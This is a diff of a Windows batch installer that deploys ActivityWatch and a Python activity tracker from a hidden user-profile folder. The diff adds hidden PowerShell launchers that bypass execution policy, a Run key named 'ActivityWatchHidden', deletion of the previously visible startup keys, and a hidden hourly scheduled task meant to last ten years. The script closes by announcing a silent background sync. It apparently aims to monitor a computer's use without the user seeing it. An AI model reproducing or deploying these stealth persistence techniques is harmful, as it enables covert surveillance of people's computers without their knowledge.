@@ -27,23 +27,39 @@ if not exist "C:\Windows\System32\vcruntime140.dll" (
     del "%TEMP%\vc_redist.x64.exe"
 )
 
-:: Create a VBScript to run trackers completely invisibly (no black windows)
+:: Create VBScript launcher (primary - zero flash, Win 98 to Win 11 current)
 echo Set WshShell = CreateObject("WScript.Shell") > "%USERPROFILE%\.aw_tracker\start_aw.vbs"
 echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-server-rust\aw-server-rust.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
 echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-afk\aw-watcher-afk.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
 echo WshShell.Run chr(34) ^& "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-window\aw-watcher-window.exe" ^& Chr(34), 0 >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
 echo Set WshShell = Nothing >> "%USERPROFILE%\.aw_tracker\start_aw.vbs"
 
-:: Run the VBScript now
-wscript.exe "%USERPROFILE%\.aw_tracker\start_aw.vbs"
+:: Create PowerShell launcher (backup - used only if VBScript is removed in a future Win 11 build)
+echo Start-Process "%USERPROFILE%\.aw_tracker\activitywatch\aw-server-rust\aw-server-rust.exe" -WindowStyle Hidden > "%USERPROFILE%\.aw_tracker\start_aw.ps1"
+echo Start-Process "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-afk\aw-watcher-afk.exe" -WindowStyle Hidden >> "%USERPROFILE%\.aw_tracker\start_aw.ps1"
+echo Start-Process "%USERPROFILE%\.aw_tracker\activitywatch\aw-watcher-window\aw-watcher-window.exe" -WindowStyle Hidden >> "%USERPROFILE%\.aw_tracker\start_aw.ps1"
+
+:: Run engines now - VBScript primary, PowerShell fallback
+where wscript.exe >nul 2>&1
+if %errorlevel% == 0 (
+    wscript.exe "%USERPROFILE%\.aw_tracker\start_aw.vbs"
+) else (
+    echo VBScript unavailable. Using PowerShell fallback...
+    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%USERPROFILE%\.aw_tracker\start_aw.ps1"
+)
 
 :: Clean up any old visible registry keys so they don't pop up on boot
 reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Server" /f >nul 2>&1
 reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Watcher-AFK" /f >nul 2>&1
 reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AW-Watcher-Window" /f >nul 2>&1
 
-:: Set auto-start on boot to run the invisible VBScript
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ActivityWatchHidden" /t REG_EXPAND_SZ /d "wscript.exe \"%USERPROFILE%\.aw_tracker\start_aw.vbs\"" /f
+:: Set auto-start on boot - VBScript primary, PowerShell fallback
+where wscript.exe >nul 2>&1
+if %errorlevel% == 0 (
+    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ActivityWatchHidden" /t REG_EXPAND_SZ /d "wscript.exe \"%USERPROFILE%\.aw_tracker\start_aw.vbs\"" /f
+) else (
+    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ActivityWatchHidden" /t REG_EXPAND_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%USERPROFILE%\.aw_tracker\start_aw.ps1\"" /f
+)
 
 :: Set up Python Tracker
 echo Setting up Python Tracker...
@@ -68,8 +84,18 @@ if exist "C:\Program Files\Python311\python.exe" (
 )
 
 :: Schedule the python script to run silently every hour, even on battery power
+:: Create VBScript task runner (primary - zero flash)
 echo CreateObject("WScript.Shell").Run "pythonw """ ^& "%USERPROFILE%\.aw_tracker\activity_tracker.py" ^& """", 0, False > "%USERPROFILE%\.aw_tracker\run_hidden_task.vbs"
-powershell -Command "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\"%USERPROFILE%\.aw_tracker\run_hidden_task.vbs\"'; $t1 = New-ScheduledTaskTrigger -AtLogOn; $t2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650); $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; Register-ScheduledTask -Action $action -Trigger @($t1, $t2) -Settings $settings -TaskName 'ActivityWatchTracker' -Force" >nul
+:: Create PowerShell task runner (backup - used only if VBScript is removed)
+echo Start-Process pythonw -ArgumentList '"%USERPROFILE%\.aw_tracker\activity_tracker.py"' -WindowStyle Hidden > "%USERPROFILE%\.aw_tracker\run_hidden_task.ps1"
+
+:: Register scheduled task - VBScript primary, PowerShell fallback
+where wscript.exe >nul 2>&1
+if %errorlevel% == 0 (
+    powershell -Command "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\"%USERPROFILE%\.aw_tracker\run_hidden_task.vbs\"'; $t1 = New-ScheduledTaskTrigger -AtLogOn; $t2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650); $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; Register-ScheduledTask -Action $action -Trigger @($t1, $t2) -Settings $settings -TaskName 'ActivityWatchTracker' -Force" >nul
+) else (
+    powershell -Command "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%USERPROFILE%\.aw_tracker\run_hidden_task.ps1\"'; $t1 = New-ScheduledTaskTrigger -AtLogOn; $t2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3650); $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden; Register-ScheduledTask -Action $action -Trigger @($t1, $t2) -Settings $settings -TaskName 'ActivityWatchTracker' -Force" >nul
+)
 
 echo Installation Complete! Chrome extension and ActivityWatch are now running silently.
 echo Triggering first background sync (will execute within 0-5 minutes)...
